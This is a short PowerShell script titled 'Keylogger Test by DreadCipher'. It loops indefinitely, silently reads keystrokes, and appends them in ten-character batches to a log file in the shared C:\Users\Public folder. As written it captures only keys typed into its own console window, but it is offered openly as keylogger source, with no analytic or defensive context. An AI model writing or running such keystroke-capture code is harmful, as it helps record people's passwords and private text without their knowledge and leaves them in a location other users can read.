# Keylogger Test by DreadCipher
$buffer = ""

while ($true) {
    Start-Sleep -Milliseconds 100
    if ([Console]::KeyAvailable) {
        $key = [Console]::ReadKey($true)
        $buffer += $key.Char
        if ($buffer.Length -ge 10) {
            $buffer | Out-File -FilePath "C:\Users\Public\log.txt" -Append
            $buffer = ""
        }
    }
}
